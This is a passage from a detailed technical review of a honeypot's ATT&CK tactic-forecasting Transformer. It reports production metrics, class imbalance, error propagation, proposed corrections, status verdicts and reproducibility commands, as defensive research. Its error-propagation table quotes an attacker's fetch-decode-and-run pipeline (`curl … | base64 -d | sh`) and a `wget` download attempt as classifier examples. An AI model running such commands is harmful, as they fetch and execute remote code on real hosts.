`NOT_DETERMINABLE`: historical/bounded session payloads contain more
classification outputs than retained command entries, legacy entries do not
all retain current `evidence_tier`, multiple rules/fragments map to one command,
and there is no durable command-to-classification group table. Reporting output
record counts as command counts would be misleading.

## 23. Quantitative prediction coverage

**Current Transformer v3 [ACTIVE_GCP_RECOVERY,
READ_ONLY_PRODUCTION_DATA], policy `2026-07-27-frozen-seed-20260721`,
snapshots 2026-07-27 07:04:24Z–2026-07-30 11:32:10Z:**

| Metric | Exact result and population |
|---|---|
| current v3 snapshots | 94 across 16 sessions |
| status | 48 predicted (51.06%); 46 insufficient history (48.94%); no current `model_unavailable` rows |
| current outbox | 60 rows/events; 60 completed with snapshot |
| current command-triggered snapshots | 48 |
| post-boundary command population | 49 unique durable command events; 48 with current-v3 snapshot (97.96%), one without (2.04%) |
| successive command pairs | 35 total: 16 changed input hash (45.71%), 9 retained it (25.71%), 10 not comparable due absent input (28.57%) |
| comparable input pairs | 25: 16 changed (64%), 9 unchanged (36%) |
| comparable forecasts | 25: 16 changed (64%), 9 unchanged (36%) |
| current ingest-to-persisted-snapshot | n=94; p50 4,740.992 ms, p95 11,563.003 ms, p99 13,235.977 ms |

The production comparison uses stored `model_input.input_hash`, not tensor
hash, because v3 snapshots do not retain the latter. Therefore “unchanged
input” is stricter than “unchanged tensor,” and the 64/36 result must not be
interpreted as probability-change rate without the separately compared output.

Across all historical schemas/policies there were 21,817 snapshots across
7,198 sessions: 21,655 v1, 7 v2, 94 v3, and 61 without a schema field. These
older rows are historical compatibility evidence, not current Transformer
performance.

Ingestion-to-classification latency, classification-to-snapshot latency and
snapshot-to-dashboard availability latency are `NOT_DETERMINABLE`: no
classification timestamp exists, and neither browser fetch nor dashboard
availability is persisted. The generic `processed_at` population is too sparse
and not a classifier boundary. No missing percentage is estimated.

## 24. Per-class model metrics

**Training corpus [HISTORICAL BENCHMARK/LOCAL artifact, not live production]:**
188,968 train examples from 109,068 sessions; tactic target occurrences:

| Tactic | Train occurrences |
|---|---:|
| Command-and-Control | 35 |
| Credential Access | 37 |
| Defense Evasion | 325 |
| Discovery | 55,584 |
| Execution | 14,243 |
| Persistence | 9,822 |
| Privilege Escalation | 160 |
| Collection, Exfiltration, Impact, Initial Access, Lateral Movement, Reconnaissance, Resource Development | 0 each |
| terminal session-end | 109,068 |

The train receipt is classifier-derived weak-label evidence from seven
chronological Zenodo members. It records trust-policy SHA-256 `1e351858…`,
not current runtime `e4fcf976…`; raw command content was not emitted.

**Immutable final cohort [HISTORICAL BENCHMARK], 237,514 sessions / 336,089
examples, 98,575 nonterminal targets:**

| Class | Support | Precision | Recall | F1 |
|---|---:|---:|---:|---:|
| Collection | 0 | 0 | 0 | 0 |
| Command-and-Control | 28 | 0 | 0 | 0 |
| Credential Access | 60 | 0 | 0 | 0 |
| Defense Evasion | 456 | 0 | 0 | 0 |
| Discovery | 60,228 | 0.482831 | 0.995949 | 0.650367 |
| Execution | 22,294 | 0.989797 | 0.996501 | 0.993138 |
| Exfiltration | 0 | 0 | 0 | 0 |
| Impact | 0 | 0 | 0 | 0 |
| Initial Access | 0 | 0 | 0 | 0 |
| Lateral Movement | 0 | 0 | 0 | 0 |
| Persistence | 15,492 | 0.982706 | 0.997676 | 0.990135 |
| Privilege Escalation | 224 | 0 | 0 | 0 |
| Reconnaissance | 0 | 0 | 0 | 0 |
| Resource Development | 0 | 0 | 0 | 0 |
| session end | 237,514 | 0.996421 | 0.729102 | 0.842055 |

Overall tactic metrics: macro precision/recall/F1
0.175381/0.213580/0.188117; macro balanced accuracy 0.598416; micro F1
0.747780; weighted F1 0.775956. Nonterminal ranking: Top-1 0.990434, Top-3
0.993102, MRR 0.992429, coverage 1.0. Evaluator coverage over all examples was
1.0 with zero abstentions.

Coverage 1.0 is a property of the frozen evaluator, not runtime no-history
behavior. The final output did not retain per-example targets, probabilities,
sequence lengths, context buckets or exact sets; calibration diagnostics,
Jaccard/Hamming/exact-set and context-specific failure analysis are
`NOT_DETERMINABLE_FROM_IMMUTABLE_FINAL_OUTPUT`.

The Transformer is dominated by Discovery, Execution, Persistence and terminal
support. Command-and-Control, Credential Access, Defense Evasion and Privilege
Escalation have zero recall; seven vocabulary tactics are absent. The original
selection was `BLOCKED_AT_SELECTION` because all complete seeds had zero recall
for reportable Defense Evasion. Professor approval later authorized only an
experimental PoC preference for frequent-behavior aggregate performance.

## 25. Mapping dependency and error propagation

The live error chain is:

```text
sanitized raw Cowrie command/event
→ conservative string splitting and reviewed regex/SecureBERT classification
→ first-tactic MITRE projection
→ trust normalization
→ observation-group tactic set
→ adjacent tactic-set phase
→ last-eight phase tensor
→ calibrated Transformer output
→ creation-time-selected dashboard row
```

The classifier processes raw command strings and its own fragments, not typed
semantic facts. Arguments and shell operators affect regex matches. `&&`,
`||`, `;` and newline can split; pipes generally do not. Command
success/failure is stored but does not alter mapping or prediction eligibility.

Important propagation examples:

| Risk | Concrete evidence and consequence |
|---|---|
| Broad regex/unsupported syntax | The pipe `curl … | base64 -d | sh` created trusted T1105+T1140 in one unordered phase. A regex can promote partial syntax without proof that either effect occurred. |
| Attempt treated like tactic observation | `wget …` with unknown outcome created a trusted Command-and-Control phase. An incorrect/overbroad rule directly changes model input. |
| Failed command | A `cowrie.command.failed` reviewed match remains trusted because outcome is not part of `classification_evidence_tier`; it can silently change a phase and yield a high calibrated output. |
| Disagreement protection | A high-confidence SecureBERT result disagreeing with a reviewed rule changes source to `rule_securebert_disagreement`; both candidates are audit-only and do not enter history. |
| Model-only protection | Current trust code requires `model_authority=reviewed_trusted_model_only`; normal classifier output does not set it. Even ≥0.90 model-only candidates remain audit-only. The configured 0.90 adapter threshold alone is insufficient authority. |
| Weak/unknown | `quuxdiag…` produced audit-only T1564 at 0.2682 and no phase. After prior history it can still cause a fresh snapshot over the old phase. |
| Incorrect tactic projection | The new isolated process without `MITRE_ATTACK_PATH` kept technique IDs but mapped tactics to unknown and abstained. Correct production path loaded ATT&CK 14.1. Configuration failure is therefore capable of removing all history. |
| Multi-label ordering loss | Three ordered chain fragments became one set `{C2, Discovery, Execution}`, so the Transformer cannot distinguish their internal order. |
| Classification uncertainty loss | Phase tensors encode source/confidence/agreement buckets, but output probability is calibrated model output only. It is not combined with an upstream probability, and rule “confidence=1.0” means policy match, not empirical correctness. |
| High probability over weak semantics | Terminal probabilities above 0.99 were emitted after command attempts. Calibration does not turn command observation into effect or intent evidence. |
| Evidence audit gap | Snapshot refs and provenance hashes support trace-back to classification observations, but the snapshot omits full phase/tensor data. Exact replay requires the historical session payload, code, policy, MITRE and artifacts. |
| Late ordering | Arrival-appended older source time violates the history contract; a later error or snapshot can supersede newer evidence by generation time. |

Repeated same-tactic evidence and unsupported evidence are not cleanly
distinguished in the persisted snapshot. Repetition buckets/technique union can
distinguish the former in the tensor; unsupported evidence disappears from
history and may affect only command-count context. The snapshot does not store
the tensor or an explicit reason for unchanged history.

## 26. Local/candidate/recovery/previous-release comparison

| Component | Local `905078c…` | Staged `6964d543…` | Active recovery `19afabd…` | Previous `325d136…` |
|---|---|---|---|---|
| prediction policy/model hashes | code/config identical | manifest-bound identical | live hashes verified | package code/config identical |
| classifier rules/trust/MITRE binding | identical files | identical files | live policy/rules/model verified; MITRE path from systemd env | package identical |
| DB schema | v3 code | v3 manifest | live `user_version=3` | v3 package |
| trigger/history/dedup/tensor/inference | code-identical | code-identical | isolated active-artifact behavior verified | code-identical |
| snapshot/outbox/API/dashboard | code-identical | code-identical | live storage/API path and aggregate rows verified | code-identical |
| unique non-prediction change | later stabilization/docs | staged feedback reader work | JSON feedback reader correction | baseline |
| live status | not applicable | **not activated; live behavior `NOT_DETERMINABLE`** | **active production behavior** | previous verified release, not active |

The recovery-versus-previous tree difference was inspected directly. The only
runtime correction is the verified JSON import in feedback review; no
prediction behavior differs. “Code-identical” does not assert that candidate
systemd environment, mutable feeds, queues or runtime state were ever live.

## 27. Unsupported and `NOT_DETERMINABLE` areas

- Exact per-command trusted/audit/unclassified percentages:
  `NOT_DETERMINABLE` from retained schema.
- Live behavior of staged candidate `6964d543…`: `NOT_DETERMINABLE`.
- Candidate activation/rollback compatibility: outside this review and not
  resumed.
- Prediction behavior for every Cowrie event type or every shell grammar:
  not supported.
- Every ATT&CK tactic as a learned class: vocabulary yes; empirical training,
  evaluation and useful recall no.
- All real Linux attacks/effects: not observable or supported.
- Real tactic/technique/objective completion: not represented.
- Attacker intent: prohibited and not inferable.
- Ingestion-to-classification, classification-to-snapshot, and
  snapshot-to-browser availability latency: timestamps absent.
- Exact reason for one post-boundary command without a current-v3 snapshot:
  `NOT_DETERMINABLE`.
- Exact final-set/calibration/context error metrics: not retained by immutable
  final output and must not be reconstructed by reopening the sealed cohort.
- Active service's in-memory MITRE object content after startup cannot be read
  directly; exact file path/hash and isolated loader result were verified,
  while service restart was prohibited.
- Source-time-correct reconstruction after a session has ended:
  unsupported; no evidence-cutoff versioning contract exists.

## 28. Misleading terminology

| Phrase | Assessment |
|---|---|
| “real-time attack prediction” | inaccurate: event-driven seconds-scale persistence, label-dependent, no attack/effect proof |
| “real-time next-step prediction” | too broad: target is not a literal next step |
| “next attack prediction” | inaccurate and overclaims intent/effect |
| “next tactic prediction” | incomplete; omits distinct phase-set and trusted-label dependency |
| “next tactic phase prediction” | closer, but “phase” needs the adjacent-run definition |
| “next distinct trusted tactic phase forecast” | accurate shorthand if ATT&CK-derived and session-end are stated |
| “session-end prediction” | accurate only for the separate terminal head; not the whole subsystem |
| “advisory behavioral forecast” | accurate but should specify ATT&CK-derived target |
| “AI attack prediction” | misleading; architecture is AI/ML, but target is not an attack or authoritative decision |

## 29. Smallest corrections

No correction was implemented.

| Type / severity | Revision/module | Current behavior → minimal correction | Tests / compatibility / blocker |
|---|---|---|---|
| correctness / high | all; `storage/backend.py:get_latest_prediction_snapshot`, outbox completion | creation time can make old evidence current → add a monotonic evidence cutoff/order to task and snapshot, select by cutoff then deterministic ID, reject/supersede stale completion | late and reordered outbox tests; schema migration; no historical rewrite; model unchanged; blocks operational use, not carefully disclosed thesis demo |
| correctness / high | all; `next_behavior_runtime.py` history builder | arrival order with decreasing source time fails contract → define and persist a causal ordering policy; either source-time sort with stable durable tie-break and rebuild/versioning, or explicit arrival-order relative time independent of source timestamp | late-event, session-rebuild, cutoff tests; may change model input contract and likely requires retraining/revalidation if ordering changes; blocks operational use |
| scientific input / high | all; `session_monitor.py`, `next_behavior_label_policy.py` | failed/unknown-outcome commands can be trusted identically to successful commands → encode outcome/proof scope and abstain or separate attempt labels; do not call Cowrie success real-host effect | failed/success/unknown tests; changes preprocessing/target distribution and likely retraining; thesis limitation if not fixed |
| scientific input / high | all; direct-transfer/history adapter | command transfer attempt creates tactic phase; direct observed transfer only context → define one proof-scoped transfer representation and target policy | attempt/direct/failed transfer tests; model contract change and retraining likely; disclose for PoC |
| scientific input / medium | all; compound grouping in `build_live_next_behavior_session` | ordered fragments collapse to one tactic set → either explicitly document set semantics or preserve fragment sequence as observation groups | chain/pipe/order tests; preserving order changes contract/retraining; terminology correction alone non-breaking |
| provenance / medium | model corpus vs runtime trust | training trust SHA `1e351858…` differs from runtime `e4fcf976…` → publish a semantic diff and quantify train/serve label impact; retrain only if acceptance threshold says necessary | corpus replay on non-final inputs; no historical rewrite; current model unchanged; thesis disclosure required |
| observability / medium | v3 snapshot/runtime builder | no tensor hash/full phase sequence; audit count hard-coded zero → persist bounded redacted phase/tensor identity and explicit unsupported-evidence delta | integrity/replay/privacy tests; schema additive; no retraining |
| correctness / medium | snapshot save | content-addressed snapshot row is mutable upsert → make same-ID bytes immutable, or update only if exact content excluding timing matches without replacing canonical creation time | retry/crash/idempotency tests; storage migration; no model change |
| correctness / low | latest query | no secondary sort on equal creation time; monitor detail uses rowid instead | order by cutoff/created time plus snapshot ID consistently in every consumer | API/UI/storage tests; no retraining |
| terminology / medium | monitor/API/docs | generic “real-time/attack/next step/confidence” fields can imply effect or accuracy | use recommended wording below and label calibrated model probability separately from evidence trust | snapshot/UI contract tests; historical adapters retained |
| missing metrics / medium | storage schema | no classification boundary/dashboard fetch timestamps | add operational stage timestamps/telemetry without raw secrets | migration/latency tests; no model change |
| classification coverage / model limitation | policy/model | 27 unreviewed rules excluded; seven tactics absent; four supported tactics zero recall | review rules independently; collect defensible support; do not merely lower trust or thresholds | frozen independent validation required; retraining required for model improvement; not a runtime hotfix |

Non-blocking enhancements include explicit “unchanged tensor/unchanged
forecast” lineage, an input OOD/low-support abstention gate, and a UI evidence
cutoff. They should follow the ordering/proof-scope corrections rather than
expand architecture.

## 30. Final status verdicts

| # | Area | Verdict | Direct reason |
|---:|---|---|---|
| 1 | Runtime trigger behavior | `WORKING_AS_DESIGNED` | exact event IDs and every `cowrie.command.` trigger are implemented and observed |
| 2 | Same-tactic update behavior | `WORKING_AS_DESIGNED` | each trigger reruns; adjacent phase compresses; tensor may change by buckets or remain identical |
| 3 | Changed-tactic update behavior | `WORKING_AS_DESIGNED` | trusted tactic-set change creates a new adjacent phase and changes input |
| 4 | Phase-history construction | `PARTIALLY_WORKING` | deterministic adjacent runs work, but attempt outcome/audit delta/order semantics are lossy |
| 5 | Multi-label handling | `PARTIALLY_WORKING` | deterministic set handling works; within-command sequence is lost |
| 6 | Unknown-command handling | `PARTIALLY_WORKING` | safe trust abstention works; after prior history it is indistinguishable from unchanged trusted history in snapshot semantics |
| 7 | Duplicate/retry handling | `WORKING_AS_DESIGNED` | deterministic event/outbox IDs and leases work; snapshot upsert mutability is a caveat |
| 8 | Late-event handling | `REQUIRES_CORRECTION` | source-time regression can invalidate history and later generation can supersede newer evidence |
| 9 | Session-close handling | `WORKING_AS_DESIGNED` | close triggers final rerun without pretending to be an input phase |
| 10 | Snapshot ordering | `REQUIRES_CORRECTION` | creation time is not evidence order and has no deterministic tie-break |
| 11 | Dashboard selection | `REQUIRES_CORRECTION` | newest computation, not newest evidence; current/detail paths can sort differently |
| 12 | Classification trust boundary | `PARTIALLY_WORKING` | strong disagreement/emergency/model-only exclusions; outcome ignored and train/runtime trust hashes differ |
| 13 | Controlled-PoC suitability | `PARTIALLY_WORKING` | usable as a disclosed advisory demonstration of frequent classes, not broad prediction |
| 14 | Scientific validity of forecast | `REQUIRES_CORRECTION` | weak-label dependence, severe class imbalance/zero recall, attempt/effect and ordering limitations |
| 15 | Common behavior coverage in this deployment | `PARTIALLY_WORKING` | discovery/execution/persistence and command attempts covered; many literal/typed behaviors do not become model history |
| 16 | All Cowrie commands | `NOT_SUPPORTED` | finite reviewed regex/SecureBERT trust boundary and bounded shell subset |
| 17 | All ATT&CK tactics | `NOT_SUPPORTED` | 14 output names exist, but seven absent and four supported tactics have zero held-out recall |
| 18 | All real Linux attacks | `NOT_SUPPORTED` | Cowrie emulation cannot observe/prove all effects, attacks, objectives or intent |
| 19 | Analyst context | `PARTIALLY_WORKING` | useful with evidence refs, limitations and advisory labeling |
| 20 | Operational decision-making | `REQUIRES_CORRECTION` | stale ordering, proof-scope and class-reliability defects |
| 21 | Automatic response | `NOT_SUPPORTED` | contract permanently prohibits alerts/actions and should remain so |

## 31. Accurate dashboard and thesis terminology

Recommended exact wording:

| Surface | Wording |
|---|---|
| Dashboard title | **Advisory next distinct ATT&CK-derived behavior-phase forecast** |
| Dashboard status | **Event-driven forecast: predicted / insufficient trusted history / model unavailable** |
| Thesis subsystem name | **Deterministic-evidence-conditioned Transformer forecast of the next distinct trusted ATT&CK tactic phase or session end** |
| Methodology | **An event-triggered advisory multi-label forecast over adjacent runs of trusted classifier-derived ATT&CK tactic sets** |
| Results | **Frozen within-dataset temporal evaluation of next distinct trusted tactic-set/session-end targets** |
| Limitations | **Classifier-dependent weak labels; attempts are not effects; phases are inferred label runs, not completed tactics; severe rare/absent-class limits; no intent or action authority** |
| Slides | **Near-real-time advisory ATT&CK phase forecast (experimental PoC; abstains without trusted history)** |

The word “confidence” should be qualified:

- classifier rule confidence is policy-match metadata, not an empirical
  probability;
- SecureBERT score is a model candidate score;
- Transformer displayed probability is a calibrated model output conditional
  on the constructed trusted-label history;
- none is confidence that an attacker completed an objective or affected a
  real host.

## 32. Reproducibility appendix with commands and fixture identifiers

### Sources and immutable identities

- local source revision: `905078ccc442699fe99b8c3787192cb7ac8488d0`;
- active source revision:
  `19afabd0bb7ed82ac93767301bb0cb1024d0b92e`;
- read-only database: `/var/lib/honeypot/production_pilot.db`, schema 3;
- policy/model/rule/trust/classifier/MITRE hashes: Section 5 and Section 22;
- final evaluation SHA-256:
  `3e82ccd46dd1114488e8e8c7cfc45522ded38ed580969f853687b233e5440c08`;
- derived post-analysis JSON SHA-256:
  `6e3ae5ed8f0a1d4b5554f54581d6afa6c469fac730797538dc625d27f42aa7b4`.

### Read-only revision/state commands

```bash
git status --short
git rev-parse HEAD
git branch --show-current
git diff --name-status 325d136a35f4e9b6cf197cc05565a0798f7b3e14..19afabd0bb7ed82ac93767301bb0cb1024d0b92e
git diff --name-status 325d136a35f4e9b6cf197cc05565a0798f7b3e14..6964d54326ba59a51cffb2f0d13d9a5b1bd858f2
git diff --name-status 6964d54326ba59a51cffb2f0d13d9a5b1bd858f2..905078ccc442699fe99b8c3787192cb7ac8488d0
```

GCP/Pi inspection used SSH with batch mode and explicit known-host files.
Commands were limited to `readlink`, `stat`, `systemctl show/cat`, hash/JSON
readers, and SQLite URI `mode=ro` with `PRAGMA query_only=ON`. No public Cowrie
traffic or event write was generated.

### Isolated fixtures

Fixture schema `next_tactic_isolated_review.v1` ran in a transient Python
process as user `honeypot` from `/opt/honeypot`, with these explicit active,
non-secret service paths:

```text
MITRE_ATTACK_PATH=/var/lib/honeypot/feeds/mitre_attack_cache.json
SECUREBERT_PATH=/opt/honeypot/models/securebert_ttp
SECUREBERT_CHECKPOINT_PATH=/opt/honeypot/models/securebert_ttp/checkpoint-6765
PREDICTION_POLICY_PATH=/opt/honeypot/configs/prediction_policy.transformer_poc.trusted.json
CLASSIFICATION_RULES_PATH=/opt/honeypot/configs/classification_rules.trusted.json
```

It constructed in-memory `SessionMonitor` states only and called the exact
classifier, history builder, tensorizer and frozen predictor. It did not call
storage or send traffic. Scenario IDs:

- `isolated-review-01`: A same-tactic repetition;
- `isolated-review-02`: B transition;
- `isolated-review-03`: C recurrence;
- `isolated-review-04`: D unknown;
- `isolated-review-05`: E multi-label pipe;
- `isolated-review-06`: F attempt/direct transfer;
- `isolated-review-07`: G close;
- `isolated-review-08`: H compound chain.

The separate I/J fixture used a temporary local SQLite database and only normal
`SQLiteStorage` event/outbox/snapshot APIs. Its exact duplicate event IDs were
equal; late distinct event IDs differed. `TemporaryDirectory` removed the
database on exit.

### Validators and tests

```bash
PYTHONDONTWRITEBYTECODE=1 \
python -m production.policies.validate_prediction_policy \
  --policy configs/prediction_policy.transformer_poc.trusted.json

PYTHONDONTWRITEBYTECODE=1 \
python -m production.policies.validate_classification_rules \
  --policy configs/classification_rules.trusted.json --json

PYTHONDONTWRITEBYTECODE=1 pytest -p no:cacheprovider -q \
  tests/test_next_behavior_runtime.py \
  tests/test_next_behavior_contract.py \
  tests/test_next_behavior_tensor.py \
  tests/test_phase3_storage_reliability.py \
  tests/test_session_close_consistency.py \
  tests/test_session_worker_event_lifecycle.py \
  tests/test_event_processing_lifecycle.py \
  tests/test_monitor_storage_contract.py
```

Results: prediction policy passed; classification-rule validator returned
`{"errors":[],"ok":true}`; tests: **89 passed, 2 skipped**. Skips were
environment-conditional private/PyTorch paths declared by tests, not failures.

### Read-only production aggregate definition

Aggregate queries exposed no raw commands, credentials, source IPs, payload
contents or secrets. Populations and exclusions are stated in Sections 22–23.
The first generic query's ad-hoc command grouping was rejected because legacy
session payload cardinalities were ambiguous; the report uses the deployed
`build_live_next_behavior_session` result instead. No missing percentage was
derived from that rejected grouping.

### Completion invariants

At completion, the GCP active release still resolved to `19afabd0…`; no
activation or rollback command was run. GCP ingest, session worker, dashboard
and monitor-web remained active with `NRestarts=0` and the unchanged
`2026-07-30 14:47:07 UTC` active-enter time. The Pi had been verified earlier
in the review with Cowrie active (`NRestarts=0`) and forwarder active
(`NRestarts=94`, active-enter time predating the review), but the final
read-only jump-host check timed out twice. End-of-task Pi restart status is
therefore `NOT_DETERMINABLE`, not assumed unchanged. Local prediction and
frozen evaluation paths had no diff from `905078c…`; temporary
scripts/databases were removed. The only repository change is this document.
